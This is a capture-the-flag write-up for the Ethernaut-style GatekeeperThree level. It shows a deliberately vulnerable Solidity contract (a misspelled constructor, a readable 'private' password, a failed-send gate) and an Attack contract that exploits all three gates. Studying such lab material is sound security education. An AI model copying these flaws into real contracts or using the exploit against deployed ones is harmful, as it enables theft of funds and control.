## Challenge
~~~
Cope with gates and become an entrant.

##### Things that might help:

- Recall return values of low-level functions.
- Be attentive with semantic.
- Refresh how storage works in Ethereum.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```
`

## Solution

gateOne:
 - wrong constructor -> become owner
 - EOA -> owner contract  -> Gatekeeper
gateTwo:
 - in the same transaction create SimpleTrick and execute checkPassword with the current block.timestamp
gateThree
- we need to send >0.001 ether to the Gatekeeper contract and at the same time to not have receive or fallback to accept funds 
  
```
contract Attack {
    GatekeeperThree gk;

    constructor() payable {

    }

    function attack(GatekeeperThree target) external {
        gk = target;
        becomeOwner();
        allowEntrance();
        sendEther();
        gk.enter();
    }

    function becomeOwner() private {
        gk.construct0r();
    }

    function allowEntrance() private {
        gk.createTrick();
        gk.getAllowance(uint256(block.timestamp));
    }

    function sendEther() private {
        (bool ok,) = address(gk).call{value: 0.00101 ether}("");
        require(ok, "sending ether failed");
    }
}
```


## Key takeaways and useful resources



